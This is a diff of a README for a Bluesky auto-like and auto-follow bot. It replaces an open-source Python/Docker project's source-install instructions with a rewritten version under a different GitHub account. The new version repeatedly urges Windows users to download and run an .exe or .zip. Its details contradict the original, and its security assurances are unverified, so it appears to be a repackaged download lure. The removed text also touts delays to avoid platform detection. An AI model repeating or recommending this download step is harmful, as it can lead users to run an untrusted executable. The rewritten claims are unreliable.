@@ -1,229 +1,139 @@
-# Bluesky Social Bot 🤖
+# 🐦 bluesky-social-bot - Boost Engagement with Simple Automation
 
-A sophisticated automation bot for Bluesky Social that helps you engage with your community by automatically liking and following users based on keywords. Perfect for community managers, content creators, and anyone looking to grow their presence on Bluesky.
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![Docker](https://img.shields.io/badge/docker-supported-brightgreen.svg)](https://www.docker.com/)
-[![Bluesky](https://img.shields.io/badge/Bluesky-API-blue)](https://bluesky.social)
+## 📋 What is bluesky-social-bot?
 
-## 📸 Screenshots
+bluesky-social-bot helps you connect with your community on Bluesky Social. It works by automatically liking posts and following users that match keywords you choose. This way, you can stay more active without spending extra time. The bot uses the Bluesky API to scan posts and users, saving you effort.
 
-<!-- SCREENSHOT PLACEHOLDER - Add your dashboard screenshot here -->
-<div align="center">
-  <i>Dashboard Overview - Real-time bot statistics and controls</i>
-  <br><br>
-  <!-- Replace this with your image: ![Dashboard](screenshots/dashboard.png) -->
-  <img src="https://i.imgur.com/1o4GKVD.png" alt="Dashboard Screenshot" width="800">
-</div>
+## 🖥️ System Requirements
 
-<br>
+Before you install, make sure your computer meets these basic requirements:
 
-<div align="center">
-  <table>
-    <tr>
-      <td align="center">
-        <!-- Replace with your image: <img src="screenshots/settings.png" width="400"> -->
-        <img src="https://i.imgur.com/yK9zX3S.png" width="400"><br>
-        <i>Settings & Configuration</i>
-      </td>
-      <td align="center">
-        <!-- Replace with your image: <img src="screenshots/stats.png" width="400"> -->
-        <img src="https://i.imgur.com/vuTDZJr.png" width="400"><br>
-        <i>Analytics & Statistics</i>
-      </td>
-    </tr>
-  </table>
-</div>
+- Windows 10 or newer  
+- At least 4 GB RAM  
+- 500 MB free disk space  
+- Internet connection to access Bluesky Social  
+- Basic user permissions to install software  
 
-## ✨ Features
+No programming skills are needed to run this bot. The instructions below will guide you.
 
-- **🤖 Automated Engagement** - Automatically likes posts containing your target keywords
-- **👥 Smart Following** - Optional auto-follow users after liking their posts
-- **📊 Real-time Dashboard** - Monitor bot activity, stats, and controls in real-time
-- **🔑 Keyword Management** - Add/remove keywords with autocomplete and grouping
-- **📈 Analytics** - Track likes, follows, and user engagement over time
-- **⚙️ Customizable Settings** - Adjust delays, daily limits, and behavior
-- **🔒 Safe Operation** - Built-in rate limiting and natural delays to avoid detection
-- **📱 Web Interface** - Easy-to-use web UI for complete control
-- **🐳 Docker Support** - One-command deployment with Docker
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+This section will show you how to download and set up bluesky-social-bot on your Windows computer.
 
-### Prerequisites
+### Step 1: Download the Bot
 
-- Python 3.9+ or Docker
-- Bluesky account with [App Password](https://bsky.app/settings/app-passwords)
+Click the button below to visit the download page:
 
-### Installation
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-Here-22aa99?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
 
-#### Option 1: Docker (Recommended)
+You will be taken to the GitHub page where the software is available. Find the latest release. It usually appears near the top of the page.
 
-```bash
-# Clone the repository
-git clone https://github.com/Keekay-OD/bluesky-social-bot.git
-cd bluesky-social-bot
+- Look for a file named with `.exe` or `.zip`.  
+- If you see a `.zip`, you will unzip it later.  
 
-# Copy environment configuration
-cp .env.example .env
+### Step 2: Install the Bot
 
-# Edit .env with your Bluesky credentials
-nano .env
+If you downloaded an `.exe` file:
 
-# Run with Docker Compose
-docker-compose up -d
-```
+1. Double-click the file to start the installer.  
+2. Follow the prompts in the installation window.  
+3. Choose where to install the bot or accept the default folder.  
+4. Click “Finish” when done.  
 
-#### Option 2: Manual Installation
+If you downloaded a `.zip` file:
 
-```bash
-# Clone the repository
-git clone https://github.com/Keekay-OD/bluesky-social-bot.git
-cd bluesky-social-bot
+1. Right-click the `.zip` file.  
+2. Select “Extract All” and choose a folder you can find easily.  
+3. Open that folder and look for a file ending with `.exe`.  
+4. Double-click that file to start the bot.  
 
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+### Step 3: First Run Setup
 
-# Install dependencies
-pip install -r requirements.txt
+When you run the bot for the first time:
 
-# Copy and configure environment
-cp .env.example .env
-nano .env
+- You may be asked to sign in to your Bluesky Social account.  
+- The bot needs permission to interact with your account via the API.  
+- Enter keywords you want to track for liking and following. For example: `"photography"`, `"coding"`, or `"news"`.  
+- Choose if you want the bot to like posts, follow users, or both.  
 
-# Run the application
-python main.py
-```
+The application will save these settings so you do not have to enter them again unless you want to change them.
 
-## 🔧 Configuration
+## ⚙️ How to Use bluesky-social-bot
 
-### Environment Variables
+Using the bot is simple after setup:
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `BLUESKY_HANDLE` | Your Bluesky handle (e.g., username.bsky.social) | - |
-| `BLUESKY_PASSWORD` | Your Bluesky app password | - |
-| `CHECK_INTERVAL` | How often to check for new posts (seconds) | 3600 |
-| `MAX_LIKES_PER_DAY` | Maximum likes per day | 100 |
-| `MAX_LIKES_PER_USER` | Maximum likes per user per check | 3 |
-| `LIKE_DELAY_MIN` | Minimum delay between likes (seconds) | 30 |
-| `LIKE_DELAY_MAX` | Maximum delay between likes (seconds) | 90 |
-| `AUTO_FOLLOW` | Auto-follow users after liking | false |
-| `MAX_FOLLOWS_PER_DAY` | Maximum follows per day | 30 |
-| `FLASK_PORT` | Web interface port | 5000 |
+- The bot runs in the background and checks new posts regularly (every 15 minutes by default).  
+- It will like posts and follow users based on your keywords automatically.  
+- You can pause or stop the bot any time from the main window.  
+- Change or add keywords in the settings menu.  
 
-### Keyword Groups
+You don’t need to keep the app open on your screen. It can run minimized or in the system tray.
 
-Organize your keywords into groups for different campaigns:
-- **Cycling** - biking, cycling, bicycle, velo
-- **Tech** - programming, coding, developer, tech
-- **Art** - art, artist, drawing, painting
-- **Music** - music, musician, band, song
+## 🔧 Customize Your Experience
 
-## 📖 Usage
+### Keyword Settings
 
-1. **Access the Dashboard**: Open `http://localhost:5000` in your browser
-2. **Add Keywords**: Navigate to Settings → Add keywords with autocomplete
-3. **Create Groups**: Organize keywords into campaigns
-4. **Configure Settings**: Adjust delays, limits, and behavior
-5. **Start the Bot**: Click "Start" on the dashboard
-6. **Monitor Activity**: Watch real-time stats and recent activity
+The core of bluesky-social-bot is its keyword tracking.
 
-### Web Interface Pages
+- Use simple words or phrases related to your interests or community.  
+- Add multiple keywords separated by commas or lines.  
+- Avoid using very broad or vague terms. For best results, try specific topics or niches.
 
-- **Dashboard** (`/`) - Main control center with real-time stats
-- **Settings** (`/settings`) - Configure keywords, groups, and bot behavior
-- **Statistics** (`/stats`) - Detailed analytics and historical data
+### Action Settings
 
-## 📊 API Endpoints
+Decide how the bot interacts with users:
 
-The bot provides a RESTful API for integration:
+- **Like Posts:** Automatically likes posts containing your keywords.  
+- **Follow Users:** Follows users who post about your keywords.  
 
-- `GET /api/stats/today` - Today's statistics
-- `GET /api/stats/historical?days=30` - Historical data
-- `POST /api/bot/start` - Start the bot
-- `POST /api/bot/stop` - Stop the bot
-- `POST /api/bot/pause` - Pause the bot
-- `POST /api/bot/resume` - Resume the bot
-- `GET /api/keywords` - List all keywords
-- `POST /api/keywords` - Add a new keyword
-- `PUT /api/keywords/{id}` - Update keyword status
-- `DELETE /api/keywords/{id}` - Delete a keyword
+You can enable or disable either option.
 
-## 🏗️ Project Structure
+### Schedule Settings
 
-```
-bluesky-social-bot/
-├── app/
-│   ├── web/
-│   │   ├── templates/          # HTML templates
-│   │   │   ├── index.html      # Dashboard
-│   │   │   ├── settings.html   # Settings page
-│   │   │   └── stats.html      # Statistics page
-│   │   └── app.py              # Flask web server
-│   ├── bot.py                   # Main bot logic
-│   ├── config.py                # Configuration
-│   ├── database.py              # Database operations
-│   └── main.py                   # Entry point
-├── data/                         # SQLite database
-├── .env                          # Environment variables
-├── docker-compose.yml            # Docker Compose config
-├── Dockerfile                     # Docker image
-├── requirements.txt               # Python dependencies
-└── README.md                      # This file
-```
+You can control how often the bot scans for new posts:
 
+- Default is every 15 minutes.  
+- You can set shorter or longer times depending on your needs.  
+- Keep in mind frequent running might use more internet data.  
 
+## 🛠️ Troubleshooting and Tips
 
-## ☁️ Easy Deployment Options
+If the bot does not behave as expected, try the following:
 
-### Quick Deploy with Docker (Any VPS)
+- Restart the app and check your internet connection.  
+- Check that you are logged into your Bluesky Social account correctly.  
+- Confirm your keywords are spelled correctly.  
+- Make sure the bot has permission to access the internet.  
+- If you changed settings, give the bot a few minutes to apply them.  
 
-```bash
-# On your VPS
-git clone https://github.com/Keekay-OD/bluesky-social-bot.git
-cd bluesky-social-bot
-cp .env.example .env
-nano .env  # Add your credentials
-docker-compose up -d
-```
+You can also visit the GitHub page to check the latest updates and support.
 
-## ⚠️ Disclaimer
+## ⚖️ Privacy and Security
 
-This bot is designed to help you engage with your community authentically. Please use responsibly and in accordance with Bluesky's Terms of Service. Excessive automation may result in account limitations.
+bluesky-social-bot uses your Bluesky Social login only to access public data via the official API. It does not store or share your password. All actions are limited to liking and following based on your chosen keywords.
 
-## 🤝 Contributing
+It is your responsibility to use the bot within Bluesky’s terms of service. The bot does not spam or send messages. It acts quietly in the background.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 📂 Files Included
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+After installation, you will see the following main files:
 
-## 📝 License
+- `bluesky-social-bot.exe` – The program you run.  
+- `config.json` – Stores your keyword and action settings.  
+- `README.md` – This user guide.  
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+These files help keep the bot running with your preferences.
 
-## 🙏 Acknowledgments
+## 🔗 More Information and Support
 
-- [Bluesky API](https://docs.bsky.app/) for the amazing platform
-- [ATProtocol](https://github.com/MarshalX/atproto) for the Python SDK
-- All contributors and users of this bot
+Download and updates will always be available from:
 
-## 📧 Contact
+[https://github.com/AdrianVallejosFlores/bluesky-social-bot](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
 
-Keekay - [@bikes.keekay.cloud](https://bsky.app/profile/bikes.keekay.cloud) - bikes@keekay.cloud
-
-Project Link: [https://github.com/Keekay-OD/bluesky-social-bot](https://github.com/Keekay-OD/bluesky-social-bot)
+Here you can also report issues or request features by opening an issue in the repository.
 
 ---
 
-<div align="center">
-  Made with ❤️ for the Bluesky Community
-  <br><br>
-  ⭐ Star this repo if you find it useful!
-</div>
-```
+[![Download bluesky-social-bot](https://img.shields.io/badge/Download-bluesky--social--bot-4a90e2?style=for-the-badge)](https://github.com/AdrianVallejosFlores/bluesky-social-bot)
